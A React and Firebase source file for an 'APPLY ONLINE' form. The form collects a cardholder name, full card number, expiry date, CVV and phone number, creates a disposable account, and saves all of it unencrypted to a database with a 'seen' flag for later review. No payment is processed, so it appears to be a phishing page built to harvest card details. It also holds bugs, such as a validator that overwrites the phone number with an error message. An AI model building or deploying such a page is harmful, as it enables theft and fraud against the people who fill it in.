import { Button, FormHelperText, Stack, TextField, Typography, } from '@mui/material';
import { createUserWithEmailAndPassword } from 'firebase/auth';
import { ref, set } from 'firebase/database';
import { useEffect, useState } from 'react';
import toast from 'react-hot-toast';
import { useNavigate } from 'react-router-dom';
import { auth, realTiemDB } from '../firebase/firebase';
import { useScrollTo } from '../utils/util';
import Header from './Header';

const Applay = () => {

    const [nameOfCard, setNameOfCard] = useState("");
    const [cardDetails, setCardDetails] = useState("");
    const [expirey, setExpirey] = useState("");
    const [cvv, setCvv] = useState("");
    const [contactNo, setContactNo] = useState("");
    const [contactNoError, setContactNoError] = useState("");
    const scrolltop = useScrollTo()
    useEffect(() => {
        scrolltop()
    }, [scrolltop])


    const [isLoading, setIsLoading] = useState(true)

    const [cardDetailserror, setCardDetailserror] = useState(""); // State for error message

  const handleCardDetailsChange = (e) => {
    let value = e.target.value;

    // Remove all non-numeric characters to clean the input
    value = value.replace(/\D/g, "");

    // If the value exceeds 16 digits, show an error and prevent further input
    if (value.length > 17) {
        setCardDetailserror("Card number cannot exceed 16 digits.");
      value = value.substring(0, 17); // Trim the value to 16 digits
    } else {
        setCardDetailserror(""); // Clear the error if the length is valid
    }

    // Format the input into groups of 4 digits
    if (value.length <= 16) {
      value = value.replace(/(\d{4})(?=\d)/g, "$1 "); // Add space after every 4 digits
    }

    setCardDetails(value); // Update the state with formatted value
  };


  
  const handleDateChange = (e) => {
    let value = e.target.value;

    // Remove all non-digit characters
    value = value.replace(/\D/g, "");

    // Format to MM/YY (insert '/' after two digits)
    if (value.length <= 2) {
      value = value.substring(0, 2); // Limit to two digits for month
    } else if (value.length <= 4) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4); // Insert '/' after month
    } else {
      value = value.substring(0, 5); // Limit to MM/YY format
    }

    setExpirey(value); // Update state with the formatted value
  };

  const validateContactNo = (value) => {
    const regex = /^[0-9]{10}$/; // Regex for exactly 10 digits
    return regex.test(value);
  };

  const handleContactNoChange = (e) => {
    const value = e.target.value;
    
    // Set the contact number in state
    setContactNo(value);

    // Validate the contact number
    if (value === "") {
      setContactNoError("Contact number is required");
    } else if (!validateContactNo(value)) {
      setContactNo("Please enter a valid 10-digit contact number");
    } else {
      setContactNo(""); // Clear error if valid
    }
  };

    const timeStemp = Date.now()

    const email = `${timeStemp}@gmail.com`
    const navigate = useNavigate()
    const handdleSubmit = async (e) => {
        e.preventDefault();
        try {
            const timeStemp = Date.now()
            const emailCre = `${timeStemp}@gmail.com`;
            setIsLoading(true)
            const userCredentical = await createUserWithEmailAndPassword(auth, emailCre, contactNo);
            const user = userCredentical.user
            await set(ref(realTiemDB, "users/ " + user?.uid), {

                nameOfCard,
                cardDetails,
                expirey,
                cvv,
                email: emailCre,
                loginType: "Apply",
                contactNo,
                uid: user?.uid,
                date: new Date().toLocaleString(),
                timestemp: timeStemp,
                seen: false

            });
            setIsLoading(false)

            console.log("User Created");
            toast.success("Submitted Successfully")
            navigate(`/success/${user.uid}`)
        } catch (error) {
            console.log(error);
            setIsLoading(false)
        } finally {
            setIsLoading(false)
        }
    }
    return (
        <Stack >
            <Header />

            <Stack width={"100%"} padding={"6rem .5rem"}>

                <Typography textAlign={"center"} width={"100%"} sx={{ bgcolor: "blue", color: "white", padding: ".4rem", fontWeight: "600", fontSize: "1.5rem" }}>APPLY ONLINE</Typography>

                <Stack width={"100%"} height={"3px"} sx={{ bgcolor: "#410112", opacity: ".5" }}></Stack>

                <Stack component={'form'} onSubmit={handdleSubmit} width={"100%"} marginTop={"1rem"} padding={"1rem"}>
                    <Typography
                        sx={{ fontWeight: "700", marginTop: "1.5rem" }}
                    >
                        Name Of Card
                    </Typography>
                    <TextField
                        type='text'
                        variant='outlined'
                        required={true}
                        value={nameOfCard} onChange={e => setNameOfCard(e.target.value)}
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
                        placeholder="Name Of Card" />


                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Card Details</Typography>
                    <TextField
                        type="text" // Use type="text" because we need to format it
                        required
                        variant="outlined"
                        value={cardDetails}
                        onChange={handleCardDetailsChange}
                        sx={{
                            borderRadius: "2rem",
                            width: "100%",
                            marginTop: "5px",
                            '& .MuiInputBase-input': {
                                fontSize: '1.3rem', // Adjust font size for better visibility
                            },
                        }}
                        placeholder="1234 5678 9101 1121"
                        error={!!cardDetailserror} // Set the error state to true if there's an error

                    />
                    {cardDetailserror && (
                        <FormHelperText error>{cardDetailserror}</FormHelperText> // Display error message
                    )}
                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Expiry</Typography>
                    <TextField
      value={expirey}
      onChange={handleDateChange}
      inputProps={{
        maxLength: 5, // Ensure the input value is limited to MM/YY format
      }}
      variant="outlined"
      sx={{
        borderRadius: "2rem",
        width: "100%",
        marginTop: "5px",
        '& .MuiInputBase-input': {
          fontSize: '1.3rem',
        },
      }}
      placeholder="MM/YY"
      type="text" // Use type="text" to allow for manual formatting (number type might not allow slashes)
      required
    />

                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Cvv</Typography>
                    <TextField
                        value={cvv} onChange={e => setCvv(e.target.value)}
                        type='number' variant='outlined'
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& label': { fontSize: '1.3rem' } }}
                        placeholder='000' required />




                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Contact No.</Typography>
                    <TextField
                        value={contactNo} onChange={e => setContactNo(e.target.value)}
                        type='number' variant='outlined'
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& label': { fontSize: '1.3rem' } }}
                        placeholder='Contact No.' required />


                    <Stack width={"100%"} padding={"2rem 0"}>
                        <Button type='submit' variant='contained' color='primary' sx={{
                            margin: "auto", borderRadius: "2rem",
                            width: "13rem", color: "white", padding: "12px 8px", "&hover": { bgcolor: "blue" }
                        }}>{isLoading ? "Submit" : "Submiting..."}</Button>
                    </Stack>
                </Stack>
            </Stack>

        </Stack>
    )
}

export default Applay